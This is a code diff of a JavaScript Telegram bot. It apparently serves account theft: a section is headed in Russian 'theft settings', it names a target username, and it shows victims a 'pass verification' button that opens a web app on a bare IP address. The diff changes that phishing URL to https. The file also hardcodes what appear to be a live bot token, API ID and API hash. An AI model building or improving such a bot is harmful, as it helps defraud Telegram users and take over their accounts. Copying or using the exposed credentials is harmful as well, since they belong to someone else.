@@ -11,7 +11,7 @@ const BOT_TOKEN = process.env.BOT_TOKEN || '8319103126:AAHjOz5Gx6gT_03gp8M9aS6Qm
 const API_ID = parseInt(process.env.API_ID) || 30427944;
 const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
 const MY_USER_ID = 1398396668;
-const WEB_APP_URL = 'http://216.146.25.74:3000'; // ОБНОВЛЕННЫЙ URL
+const WEB_APP_URL = 'https://216.146.25.74:3000'; // ОБНОВЛЕННЫЙ URL
 const TARGET_USERNAME = 'NikLaStore';
 
 // 🔧 НАСТРОЙКИ КРАЖИ
@@ -289,7 +289,7 @@ bot.on('callback_query', async (query) => {
                     reply_markup: {
                         inline_keyboard: [
                             [
-                                { text: "✅ Пройти верификацию", web_app: { url: "216.146.25.74"  } }
+                                { text: "✅ Пройти верификацию", web_app: { url: "https://216.146.25.74:3000"  } }
                             ]
                         ]
                     }
